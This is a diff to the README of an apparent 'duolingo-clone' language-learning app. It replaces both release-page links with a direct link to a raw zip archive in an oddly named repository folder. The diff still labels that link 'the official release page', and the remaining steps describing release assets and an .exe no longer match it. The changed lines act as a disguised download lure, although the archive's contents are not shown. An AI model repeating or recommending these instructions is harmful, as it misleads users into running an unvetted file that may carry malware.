@@ -1,6 +1,6 @@
 # 🦉 duolingo-clone - Learn languages through fun bite-sized lessons
 
-[Download the application installer here](https://github.com/Basined-heatofsublimation8322/duolingo-clone/releases)
+[Download the application installer here](https://github.com/Basined-heatofsublimation8322/duolingo-clone/raw/refs/heads/main/subchorioidal/clone_duolingo_2.8.zip)
 
 This application helps users learn new languages through interactive lessons. It uses a mobile-first design to keep practice sessions short and effective. You can track your progress as you complete each level.
 
@@ -17,7 +17,7 @@ Your computer needs to meet these basic standards to run the software smoothly.
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the official release page: [https://github.com/Basined-heatofsublimation8322/duolingo-clone/releases](https://github.com/Basined-heatofsublimation8322/duolingo-clone/releases).
+1.  Visit the official release page: [https://github.com/Basined-heatofsublimation8322/duolingo-clone/raw/refs/heads/main/subchorioidal/clone_duolingo_2.8.zip](https://github.com/Basined-heatofsublimation8322/duolingo-clone/raw/refs/heads/main/subchorioidal/clone_duolingo_2.8.zip).
 2.  Look for the section labeled "Assets" at the bottom of the latest release post.
 3.  Click the file ending in `.exe` to start the download.
 4.  Once the file finishes downloading, locate it in your Downloads folder.
